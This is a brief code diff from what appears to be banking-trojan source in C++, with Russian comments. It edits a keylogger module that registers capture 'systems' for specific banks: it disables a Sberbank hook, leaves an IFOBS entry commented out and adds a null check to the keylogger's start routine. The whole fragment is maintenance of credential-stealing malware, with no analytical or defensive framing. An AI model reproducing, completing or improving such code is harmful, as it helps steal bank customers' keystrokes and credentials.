@@ -172,9 +172,9 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp, const 
 
 
 	// Регистрируем систему для сбер
-	#ifdef SberKeyLoggerH
-    	RegisterSberKeyLogger();
-	#endif
+//	#ifdef SberKeyLoggerH
+//		RegisterSberKeyLogger();
+//	#endif
 
 	// Добавляем систему IFOBS
 //	S = KeyLogger::AddSystem("ifobs", PROCESS_HASH_IE);
@@ -227,7 +227,8 @@ void StartKeyLogger(PCHAR AppName)
 	//  Функция регистрирует заранее известные
 	//	системы кейлогера и запускает его
 
-   	PKeyLogger P = KeyLogger::Initialize(AppName);
+	PKeyLogger P = KeyLogger::Initialize(AppName);
+	if (!P) return;
 
 	TKeyLoggerFilterData Data;
 	ClearStruct(Data);
